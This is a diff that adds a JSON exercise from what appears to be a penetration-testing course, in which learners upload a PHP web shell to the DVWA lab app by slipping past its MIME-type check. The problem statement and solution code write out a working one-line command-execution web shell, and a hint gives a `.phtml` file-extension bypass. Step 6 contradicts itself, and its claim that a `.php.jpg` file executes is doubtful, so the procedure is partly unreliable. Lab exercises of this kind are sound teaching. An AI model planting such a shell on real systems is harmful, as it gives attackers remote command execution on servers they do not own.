@@ -1,0 +1,14 @@
+{
+    "id": "task3",
+    "chapterId": "ch_8",
+    "title": "File Upload to Web Shell",
+    "description": "Bypass upload restrictions and upload a PHP web shell on DVWA.",
+    "estimatedMinutes": 30,
+    "problemStatement": "# Objective\nUpload a PHP web shell via DVWA's File Upload vulnerability (Medium Security) and execute commands.\n\n## Steps\n1.  Set DVWA security to **Medium**.\n2.  Create a simple PHP web shell: `<?php system($_GET['cmd']); ?>`\n3.  Save it as `shell.php.jpg`.\n4.  Attempt to upload it. Note the error message (Medium level checks MIME type).\n5.  Use **Burp Suite** to intercept the upload request.\n6.  Modify the `Content-Type` header from `image/jpeg` to `image/jpeg` (it's already that because of `.jpg` extension), but ensure the file contains PHP code. The medium level only checks MIME type, so `shell.php.jpg` with `Content-Type: image/jpeg` should pass.\n7.  After upload, navigate to the file location (usually `../../hackable/uploads/shell.php.jpg`).\n8.  Append `?cmd=whoami` to the URL.\n\n## Deliverable\nScreenshot showing the output of `whoami` (should be `www-data`).",
+    "hints": [
+        "Burp Proxy -> Intercept On. Upload the file, then modify the request in Proxy -> Forward.",
+        "If the file doesn't execute, try renaming to `shell.phtml` and adjusting content-type."
+    ],
+    "expectedOutput": "Command output displayed in browser.",
+    "solutionCode": "# Web Shell Code (shell.php.jpg):\n<?php system($_GET['cmd']); ?>\n\n# After upload, visit:\nhttp://192.168.56.101/dvwa/hackable/uploads/shell.php.jpg?cmd=whoami\n\n# For High Security (combines extension and content check):\n# Use a valid image and embed PHP code in EXIF or use polyglot files (beyond this task)."
+}
